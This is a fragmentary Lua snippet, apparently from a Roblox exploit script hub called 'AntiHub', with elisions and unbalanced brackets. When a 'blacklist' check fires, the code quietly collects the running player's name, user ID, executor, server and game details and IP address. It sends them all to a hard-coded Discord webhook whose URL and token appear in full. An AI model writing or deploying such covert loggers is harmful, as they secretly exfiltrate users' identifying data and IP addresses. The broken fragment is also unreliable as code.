...
local S = pcall(function()
	Req = clonefunction(http.request)
end)
...
if not S then
  ...
  local uip = 	Req({
	...
	local LocalPlayer = game:GetService("Players").LocalPlayer
	local PL = "## AntiHub BL Activated\n\n**Name**\n".. LocalPlayer.Name.. " (".. LocalPlayer.DisplayName.. ")\n\n**UserID**\n".. tostring(game:GetService("Players").LocalPlayer.UserId).. "\n\n**Version**\n".. _G.AHSV.. "\n\n**IsPlus**\n".. tostring(type(_G.AHAKIPU(LocalPlayer.UserId)) == "number").. "\n\n**Executor**\n".. identifyexecutor().. "\n\n**JobID**\n".. game.JobId.. "\n\n**Game**\n".. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.. "\n\n**IP**\n".. uip
	Req({
		Url = "https://discord.com/api/webhooks/1407720190757830676/JK0AIRfr6ikLRM1IkizmBFhrD_As2fESO_rkIf8-0XXeI0_2bgQa1e-F6zYrjavehrVM",
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json",
		},
		Body = game:GetService("HttpService"):JSONEncode({["content"] = PL})
	})
end)
            _G.AHAKE = "loaded"
	end)
